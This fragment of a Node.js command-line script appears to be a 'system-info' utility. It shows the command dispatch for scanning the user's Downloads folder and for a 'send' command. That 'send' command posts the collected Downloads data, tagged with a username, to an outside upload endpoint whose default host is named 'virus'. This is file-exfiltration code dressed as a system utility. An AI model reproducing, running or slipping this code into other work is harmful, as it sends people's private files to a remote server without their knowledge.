  }
} else if (args[0] === 'downloads') {
  const outputFile = (args[1] === 'json' ? args[2] : args[1]) || 'downloads-scan.json';
  const downloadsDir = CodeFileManager.getDownloadsDir();
  const payload = collectDownloadsPayload(downloadsDir);
  try {
    fs.writeFileSync(outputFile, JSON.stringify(payload, null, 2), 'utf8');
    console.log(`✅ Downloads scan JSON written to: ${outputFile}`);
  } catch (err) {
    console.error(`❌ Failed to write JSON: ${err.message}`);
  }
} else if (args[0] === 'send') {
  const targetUrl = args[1] || 'https://virus-pdn4.onrender.com/upload';
  const username = args[2] || 'anonymous';
  const downloadsDir = CodeFileManager.getDownloadsDir();
  const payload = collectDownloadsPayload(downloadsDir);
  payload.username = username;
  postJSON(targetUrl, payload)
    .then(result => {
      console.log(`✅ Sent to ${targetUrl} (status ${result.status})`);
      console.log(result.body);
    })
    .catch(err => {
      console.error(`❌ Failed to send payload: ${err.message || err}`);
    });
} else {
  console.error(`❌ Unknown command: ${args[0]}`);
  console.log('\nUse "node system-info.js --help" for usage information\n');
}

// Export classes for use as module
module.exports = { SystemInfoCollector, CodeFileManager };
